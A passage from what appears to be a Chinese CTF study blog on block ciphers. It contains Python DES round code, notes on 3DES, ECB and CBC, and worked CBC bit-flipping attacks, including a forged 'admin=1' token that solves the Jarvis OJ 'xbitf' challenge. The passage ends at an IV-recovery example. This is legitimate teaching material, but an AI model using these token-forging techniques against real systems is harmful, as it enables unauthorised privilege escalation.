class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>], [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>], [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>], [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>], [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>], [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>], [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>], [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>], [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">    ]]</span><br><span class="line"></span><br><span class="line">    m = [m[i:i + <span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">6</span>)]</span><br><span class="line">    res = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p = m[i]</span><br><span class="line">        z = <span class="built_in">int</span>(<span class="built_in">str</span>(p[<span class="number">0</span>]) + <span class="built_in">str</span>(p[<span class="number">5</span>]), <span class="number">2</span>)</span><br><span class="line">        h = <span class="built_in">int</span>(<span class="built_in">str</span>(p[<span class="number">1</span>]) + <span class="built_in">str</span>(p[<span class="number">2</span>]) + <span class="built_in">str</span>(p[<span class="number">3</span>]) + <span class="built_in">str</span>(p[<span class="number">4</span>]), <span class="number">2</span>)</span><br><span class="line">        r = s[i][z][h]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">bin</span>(r)[<span class="number">2</span>:].zfill(<span class="number">4</span>):</span><br><span class="line">            res.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># E盒扩展</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Expand</span>(<span class="params">m</span>):</span><br><span class="line">    e = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> e]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># P盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">m</span>):</span><br><span class="line">    p = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> p]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 16轮加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cipher_function</span>(<span class="params">m, sub_key</span>):</span><br><span class="line">    t = xor(Expand(m), sub_key)</span><br><span class="line">    t = S(t)</span><br><span class="line">    t = P(t)</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交换左右子秘钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_round</span>(<span class="params">l, r, sub_key</span>):</span><br><span class="line">    <span class="keyword">return</span> r, xor(l, cipher_function(r, sub_key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    sub_keys = key_generate(key)</span><br><span class="line">    l, r = IP(plain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    <span class="keyword">return</span> FP(r + l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    sub_keys = key_generate(key)[::-<span class="number">1</span>]</span><br><span class="line">    l, r = IP(plain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    <span class="keyword">return</span> FP(r + l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_encrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    <span class="comment"># 字符串转16进制</span></span><br><span class="line">    plain = <span class="built_in">int</span>(plain.encode().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 再转2进制数组</span></span><br><span class="line">    plain_array = int2bin(plain, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 秘钥转16进制</span></span><br><span class="line">    key = <span class="built_in">int</span>(key.encode().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 再转2进制数组</span></span><br><span class="line">    key_array = int2bin(key, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 加密运算</span></span><br><span class="line">    encrypt_array = encrypt(plain_array, key_array)</span><br><span class="line">    <span class="comment"># 2进制数组转数值</span></span><br><span class="line">    encrypt_res = bin2int(encrypt_array)</span><br><span class="line">    <span class="keyword">return</span> encrypt_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_decrypt</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    <span class="comment"># 密文转2进制数组</span></span><br><span class="line">    cipher_array = int2bin(cipher, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 秘钥转16进制</span></span><br><span class="line">    key = <span class="built_in">int</span>(key.encode().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 再转2进制数组</span></span><br><span class="line">    key_array = int2bin(key, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 解密运算</span></span><br><span class="line">    decrypt_array = decrypt(cipher_array, key_array)</span><br><span class="line">    <span class="comment"># 2进制数组转16进制字符串</span></span><br><span class="line">    decrypt_res = <span class="built_in">hex</span>(bin2int(decrypt_array))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(decrypt_res).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆成左右两半</span></span><br><span class="line">part_encode = <span class="number">0x92d915250119e12b</span></span><br><span class="line">part_encode = <span class="built_in">bin</span>(part_encode)[<span class="number">2</span>:]</span><br><span class="line">l_part_encode = [<span class="built_in">int</span>(part_encode[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">r_part_encode = [<span class="built_in">int</span>(part_encode[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">64</span>)]</span><br><span class="line"><span class="comment"># 子秘钥拆成16组</span></span><br><span class="line">key = <span class="number">0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84</span></span><br><span class="line">key = <span class="built_in">bin</span>(key)[<span class="number">2</span>:]</span><br><span class="line">sub_keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s_k = key[i * <span class="number">48</span>:(i + <span class="number">1</span>) * <span class="number">48</span>]</span><br><span class="line">    k = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s_k:</span><br><span class="line">        k.append(<span class="built_in">int</span>(j))</span><br><span class="line">    sub_keys.append(k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="comment"># 正向加密</span></span><br><span class="line">    l, r = l_part_encode, r_part_encode</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s, <span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    cipher_array = FP(r + l)</span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    s_k = sub_keys[::-<span class="number">1</span>]</span><br><span class="line">    l, r = IP(cipher_array)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, s_k[i])</span><br><span class="line">    decrypt_array = FP(r + l)</span><br><span class="line">    decrypt_res = <span class="built_in">hex</span>(bin2int(decrypt_array))[<span class="number">2</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(decrypt_res))</span><br></pre></td></tr></table></figure>
<p>得到有意义的字符串为<strong>y0ur9Ood</strong>。</p>
<h3 id="des-1">3DES</h3>
<p>相当于是对每个数据块应用三次DES算法。</p>
<p>有<strong>3</strong>个独立密钥的<strong>3DES</strong>的密钥安全性为<strong>168</strong>位，但由于中途相遇攻击【知道明文和密文】，它的有效安全性仅为<strong>112</strong>位。</p>
<h4 id="加密">加密</h4>
<p>密文 = <strong>Ek3(Dk2(Ek1(明文)))</strong></p>
<blockquote>
<p>不是Ek3(Ek2(Ek1(明文)))，是为允许<strong>3DES</strong>用户通过重复密钥来解密由旧的单个<strong>DES</strong>用户加密的数据。</p>
<p>即重复秘钥时，3DES降级为DES。</p>
</blockquote>
<h4 id="解密">解密</h4>
<p>明文 = <strong>Dk3(Ek2(Dk1(密文)))</strong></p>
<h3 id="常见出题思路">常见出题思路</h3>
<p>普通题目：<strong>CBC</strong>模式攻击、<strong>Feistel</strong>结构的简单攻击方法。</p>
<p>困难题目：需计算差分、积分、代数、<strong>MITM</strong>等。</p>
<h3 id="ecb模式">ECB模式</h3>
<p>相同的明文分组会被转换为相同的密文分组，一组<strong>16</strong>个字节，当最后一个明文分组的内容小于分组长度时，需要用一些特定的数据进行填充。</p>
<p>我们可以将其理解为是一个巨大的明文分组→密文分组的对应表，因此<strong>ECB</strong>模式也称为电子密码本模式。</p>
<p>因此，如果明文中存在多个相同的明文分组，则这些明文分组最终都将被转换为相同的密文分组。这样一来，只要观察一下密文，就可以知道明文存在怎样的重复组合，并可以以此为线索来破译密码，因此<strong>ECB</strong>模式存在一定风险，且攻击者无需破译密码就能操纵明文【交换密文块来颠倒语意。</p>
<figure>
<img src="/images/Study-Cipher-Block/Ecb_encryption.png"
alt="區塊加密法工作模式- 維基百科，自由的百科全書" />
<figcaption aria-hidden="true">區塊加密法工作模式-
維基百科，自由的百科全書</figcaption>
</figure>
<h3 id="cbc模式">CBC模式</h3>
<p><strong>CBC</strong>模式的加密方式为分组后，第一组和作为偏移量的随机字符串异或后被另一个作为秘钥的随机字符串加密，得到的密文用作下一组明文加密前的异或字符串操作，因此其优于<strong>ECB</strong>模式的一点是不会被交换密文的方式颠倒语意。</p>
<figure>
<img src="/images/Study-Cipher-Block/Cbc_encryption.png"
alt="區塊加密法工作模式- 維基百科，自由的百科全書" />
<figcaption aria-hidden="true">區塊加密法工作模式-
維基百科，自由的百科全書</figcaption>
</figure>
<h4 id="cbc比特翻转攻击">CBC比特翻转攻击</h4>
<p>已知明文攻击，可以通过修改密文，来使密文解密出来的特定位置的字符变成我们想要的字符，但会使得前序密文无意义。</p>
<p>只需将上一组对应位置的字符与已知对应位置的明文和目标解密明文分别异或一次即可。</p>
<h5 id="例题">例题</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&quot;hahahahahahahaha=1;admin=0;uid=1&quot;</span></span><br><span class="line">key = <span class="string">b&quot;1234567890abcdef&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;fedcba0987654321&quot;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = aes.encrypt(m)</span><br><span class="line"><span class="built_in">print</span>(binascii.b2a_hex(c))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 49a98685a527bdfa4077c400963a4e3c9effb4148566f10bce9e07ccbb731896</span></span><br></pre></td></tr></table></figure>
<p>那么根据公式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">∵</span><br><span class="line">Decrypt(Cipher[2][i]) = Cipher[1][i] ^ Plain[2][i]</span><br><span class="line">Plain[2][i] == 0</span><br><span class="line">Plain[2][i] → x</span><br><span class="line">∴</span><br><span class="line">Plain[2][i] ^ x = 0 ^ x = x</span><br><span class="line">Decrypt(Cipher[2][i]) = Cipher[1][i] ^ Plain[2][i] ^ x</span><br></pre></td></tr></table></figure>
<p>因此根据上述公式构造<strong>Payload</strong>来进行<strong>CBC</strong>翻转攻击使得<strong>admin=1</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&quot;hahahahahahahaha=1;admin=0;uid=1&quot;</span></span><br><span class="line">key = <span class="string">b&quot;1234567890abcdef&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;fedcba0987654321&quot;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="comment"># c = aes.encrypt(m)</span></span><br><span class="line"><span class="comment"># print(binascii.b2a_hex(c))</span></span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;49a98685a527bdfa4077c400963a4e3c9effb4148566f10bce9e07ccbb731896&quot;</span></span><br><span class="line">tmp = <span class="built_in">int</span>(c[<span class="number">9</span> * <span class="number">2</span>:<span class="number">10</span> * <span class="number">2</span>]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">fake_cipher = c[:<span class="number">9</span> * <span class="number">2</span>] + <span class="built_in">str</span>(tmp) + c[<span class="number">10</span> * <span class="number">2</span>:]</span><br><span class="line">d = aes.decrypt(<span class="built_in">bytes</span>.fromhex(fake_cipher))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\xf0\xe6(r\xf6i\xb0\x9aC\x98\x9d\xba\xb0\x01\xd6#=1;admin=1;uid=1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>可见<strong>admin</strong>已经成功更改为<strong>1</strong>，但前序明文无意义了。</p>
<h5 id="例题-1">例题</h5>
<p><strong>Jarvis OJ</strong>的一题<strong>xbitf</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="comment">#import signal</span></span><br><span class="line"><span class="comment">#signal.alarm(600)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc</span>(<span class="params">key,iv,m</span>):</span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.encrypt(m).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_dec</span>(<span class="params">key,iv,c</span>):</span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.decrypt(c.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">16</span>)</span><br><span class="line">iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">session=os.urandom(<span class="number">8</span>)</span><br><span class="line">token=<span class="string">&quot;session=&quot;</span>+session.encode(<span class="string">&quot;hex&quot;</span>)+<span class="string">&quot;;admin=0&quot;</span></span><br><span class="line">checksum=aes_cbc(key,iv,token)</span><br><span class="line"><span class="built_in">print</span> token+<span class="string">&quot;;checksum=&quot;</span>+checksum</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    token_rcv=raw_input(<span class="string">&quot;token:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token_rcv.split(<span class="string">&quot;admin=&quot;</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> token_rcv.split(<span class="string">&quot;session=&quot;</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">16</span>].decode(<span class="string">&quot;hex&quot;</span>)==session:</span><br><span class="line">        c_rcv=token_rcv.split(<span class="string">&quot;checksum=&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        m_rcv=aes_cbc_dec(key,iv,c_rcv)</span><br><span class="line">        <span class="built_in">print</span> m_rcv</span><br><span class="line">        <span class="keyword">if</span> m_rcv.split(<span class="string">&quot;admin=&quot;</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># session=762fda4eacfb8321;admin=0;checksum=</span></span><br><span class="line"><span class="comment"># 77df89f8da92cbde1baa5d34a9e9e791c763cf14ef63dc3c32ce1e757603de30</span></span><br></pre></td></tr></table></figure>
<p>那么依题意。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">token = <span class="string">&quot;session=762fda4eacfb8321;admin=0;checksum=77df89f8da92cbde1baa5d34a9e9e791c763cf14ef63dc3c32ce1e757603de30&quot;</span></span><br><span class="line"></span><br><span class="line">cipher = token.split(<span class="string">&quot;checksum=&quot;</span>)[<span class="number">1</span>].strip().decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">fake_cipher = (cipher[:<span class="number">15</span>] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[<span class="number">15</span>]) ^ <span class="number">0</span> ^ <span class="number">1</span>) + cipher[<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;session=762fda4eacfb8321;admin=1;checksum=&quot;</span> + fake_cipher.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># session=762fda4eacfb8321;admin=1;checksum=77df89f8da92cbde1baa5d34a9e9e790c763cf14ef63dc3c32ce1e757603de30</span></span><br></pre></td></tr></table></figure>
<p>就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session=762fda4eacfb8321;admin=0;checksum=77df89f8da92cbde1baa5d34a9e9e791c763cf14ef63dc3c32ce1e757603de30</span><br><span class="line">token:session=762fda4eacfb8321;admin=1;checksum=77df89f8da92cbde1baa5d34a9e9e790c763cf14ef63dc3c32ce1e757603de30</span><br><span class="line">�l!_��zvИ�%��acfb8321;admin=1</span><br><span class="line">flag&#123;xman_bit_flip_112233&#125;</span><br></pre></td></tr></table></figure>
<h4 id="cbc选择密文攻击">CBC选择密文攻击</h4>
<p>攻击目的是恢复出偏移量<strong>IV</strong>，当输入密文可控且有解密后明文返回时可解。</p>
<p>明文每次加密前都会和<strong>IV</strong>异或，<strong>IV</strong>每次会更新为上一组的密文。</p>
<p>则满足上述条件时，使得<strong>cipher[0]==cipher[1]</strong>，<strong>IV</strong>可解，公式如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">∵</span><br><span class="line">Decrypt(Cipher[0]) ^ IV = Plain[0]</span><br><span class="line">Decrypt(Cipher[1]) ^ Cipher[0] = Plain[1]</span><br><span class="line">Cipher[0] == Cipher[1]</span><br><span class="line">∴</span><br><span class="line">IV = Plain[0] ^ Plain[1] ^ Cipher[0]</span><br></pre></td></tr></table></figure>
<h5 id="例题-2">例题</h5>
<p><strong>Jarvis OJ</strong>的一题<strong>xcc</strong>。</p>
